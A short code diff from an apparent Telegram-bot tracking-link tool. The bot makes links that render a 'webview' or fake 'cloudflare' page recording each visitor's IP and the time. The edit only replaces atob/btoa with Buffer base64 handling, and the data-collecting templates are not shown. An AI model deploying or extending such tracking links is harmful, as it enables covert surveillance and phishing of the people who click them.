@@ -32,7 +32,7 @@ app.get("/w/:path/:uri", (req, res) => {
     let d = new Date().toJSON().slice(0, 19).replace('T', ':');
 
     if (req.params.path) {
-        res.render("webview", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+        res.render("webview", { ip, time: d, url: Buffer.from(req.params.uri, "base64").toString("utf-8"), uid: req.params.path, a: hostURL, t: use1pt });
     } else {
         res.redirect("https://t.me/th30neand0nly0ne");
     }
@@ -43,7 +43,7 @@ app.get("/c/:path/:uri", (req, res) => {
     let d = new Date().toJSON().slice(0, 19).replace('T', ':');
 
     if (req.params.path) {
-        res.render("cloudflare", { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
+        res.render("cloudflare", { ip, time: d, url: Buffer.from(req.params.uri, "base64").toString("utf-8"), uid: req.params.path, a: hostURL, t: use1pt });
     } else {
         res.redirect("https://t.me/th30neand0nly0ne");
     }
@@ -131,7 +131,7 @@ bot.on('callback_query', async (callbackQuery) => {
 async function createLink(cid, msg) {
     const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
     if ((msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) && !encoded) {
-        const url = cid.toString(36) + '/' + btoa(msg);
+        const url = cid.toString(36) + '/' + Buffer.from(msg, "utf-8").toString("base64");
         const m = { reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]] }) };
         const cUrl = `${hostURL}/c/${url}`;
         const wUrl = `${hostURL}/w/${url}`;
